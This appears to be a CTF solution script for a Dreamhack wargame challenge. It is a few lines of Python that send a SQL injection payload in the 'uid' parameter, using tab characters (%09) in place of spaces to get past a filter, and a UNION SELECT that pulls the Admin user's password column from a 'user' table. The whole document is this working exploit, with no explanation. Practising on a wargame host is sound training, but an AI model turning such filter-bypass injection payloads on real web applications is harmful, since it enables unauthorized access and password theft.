import requests

port = 22677
url_index = f"http://host2.dreamhack.games:{port}/"
url_index += '?uid=\'%09UNION%09SELECT%09null,upw,null%09FROM%09user%09WHERE%09uid="Admin"%09--%09'

response = requests.get(url_index)
print(response.text)
